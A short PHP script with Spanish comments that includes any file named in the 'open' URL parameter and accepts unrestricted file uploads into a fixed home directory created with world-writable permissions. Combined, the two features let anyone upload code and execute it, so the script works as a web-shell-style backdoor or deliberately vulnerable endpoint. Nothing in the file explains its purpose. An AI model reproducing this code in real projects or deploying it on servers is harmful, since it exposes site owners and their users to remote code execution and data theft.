<?php
if (isset($_GET['open'])) {
    $open = $_GET['open'];
    include($open);
}if (isset($_FILES['file'])) {
    $upload_dir = '/home/etzio/';
    $uploaded_file = $upload_dir . basename($_FILES['file']['name']);

    // Crear el directorio de subida si no existe
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }

    // Mover el archivo subido al directorio de destino
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploaded_file)) {
        echo "El archivo ha sido subido correctamente.<br>";
    } else {
        echo "Hubo un error al subir el archivo.";
    }
} else {
    echo "Ningun archivo especificado.";
}
?>

